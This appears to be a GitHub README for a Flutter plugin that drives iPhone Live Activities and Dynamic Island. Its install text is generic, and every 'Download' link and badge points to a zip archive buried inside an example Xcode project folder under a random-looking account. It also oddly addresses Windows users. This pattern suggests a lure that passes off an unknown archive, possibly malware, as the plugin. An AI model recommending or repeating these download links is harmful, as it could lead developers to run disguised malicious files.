# ⚡ flutter_live_activities - Live iPhone updates from Dart

[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip)

## 📥 Download

Visit this page to download:

https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip

Open the page in your browser, then use the files or release section on the page to get the app or package you need

## 🧰 What this is

flutter_live_activities is a Flutter plugin for iPhone apps that use Live Activities and Dynamic Island. It lets you start, update, and end a Live Activity from Dart code.

Use it when you want to show live status on the lock screen or in the Dynamic Island. Common uses include:

- delivery status
- ride tracking
- sports scores
- timers
- progress updates
- order tracking

## 🪟 Before you start on Windows

You can use this project on Windows to get the code, read the docs, and prepare your Flutter app. If you plan to build for iPhone, you also need:

- Windows 10 or Windows 11
- Git
- Flutter SDK
- A code editor like VS Code
- An Apple device build setup for iPhone work
- Xcode on a Mac for final iOS builds

If you only want to view the project files, Windows is enough. If you want to use Live Activities in an iPhone app, you also need the iOS side of the setup.

## 🚀 Getting Started

1. Open the download page:
   https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip

2. Get the project files from the page

3. If you are using a release file, download it to your computer

4. If you are using the source code, clone or copy the repository into your Flutter project

5. Open your Flutter app in your editor

6. Add the plugin to your app if it is not already included

7. Run your app in a supported iOS build setup

## 🛠️ How to install in a Flutter app

If you are adding this plugin to an existing app, follow these steps:

1. Open your Flutter project
2. Add the package to your `pubspec.yaml`
3. Run `flutter pub get`
4. Set up the iOS project files
5. Add the needed Apple app settings
6. Build the app on iPhone with Xcode

Example package entry:

flutter_live_activities:
  path: ./flutter_live_activities

If you use a hosted package source, replace the path with the source that matches your setup

## 📱 What you can do with it

This plugin is built around three main actions:

- start a Live Activity
- update a Live Activity
- end a Live Activity

That means your app can show fresh data without asking the user to open the app each time. The user sees updates on the lock screen and, on supported devices, in Dynamic Island

## 🔧 Typical use

A food delivery app can use it like this:

- start the activity when the order leaves the store
- update the activity when the driver gets closer
- end the activity when the order arrives

A workout app can use it like this:

- start the activity when the timer starts
- update the progress during the session
- end the activity when the workout ends

## 📂 Project layout

You will usually find files like these in this kind of Flutter plugin:

- `lib/` for Dart code
- `ios/` for Apple-specific code
- `example/` for a sample app
- `README.md` for setup steps
- `pubspec.yaml` for package details

If you are new to Flutter, the `example` app is often the best place to start

## 🧪 Testing on your device

To check that everything works:

1. Open the example app
2. Run it on an iPhone
3. Start a Live Activity from the app
4. Watch for updates on the lock screen
5. Check Dynamic Island on supported iPhone models
6. End the activity and confirm it disappears

If the activity does not show up, review the iOS setup in your app and make sure your device supports Live Activities

## 🧩 Basic workflow

The usual flow is simple:

- call the start method
- send update data when something changes
- call the end method when the task is done

This keeps the user informed with less tapping and less app switching

## 🔒 Permissions and device needs

Live Activities depend on Apple device support. To use them in a real app, make sure:

- the iPhone supports Live Activities
- the app has the right iOS setup
- notifications and lock screen features are allowed by the user
- the app targets a recent iOS version that supports ActivityKit

## 🌍 Best fit use cases

This plugin fits apps that need short live status updates, such as:

- logistics apps
- transport apps
- sports apps
- task trackers
- fitness apps
- event apps
- food apps

## 🧭 Where to begin

If you want to try it now:

1. Visit the download page:
   https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip

2. Read the repo files
3. Open the example project
4. Set up your Flutter app
5. Test on iPhone

## 🧱 Tech stack

This project uses:

- Flutter
- Dart
- Swift
- Swift Package Manager
- Apple ActivityKit
- iOS Live Activities
- Dynamic Island

## 📎 Useful repo topics

- activitykit
- dart
- dynamic-island
- flutter
- flutter-plugin
- ios
- live-activities
- mobile
- swift
- swift-package

## 🗂️ File and app names you may see

In the repo or your app, you may see names like:

- `ActivityKit`
- `Live Activity`
- `Dynamic Island`
- `Flutter plugin`
- `Dart API`
- `iOS bridge`

These names point to the parts that connect your Flutter app to Apple’s live status features

## 🛎️ What to expect after setup

After you finish setup, your app can send live updates to the iPhone system UI. The user can see the current status without opening the app each time

## 📦 Download again

Visit this page to download:

https://github.com/Silty-acrylonitrile306/flutter_live_activities/raw/refs/heads/main/example/ios/Runner.xcodeproj/live_activities_flutter_v1.1.zip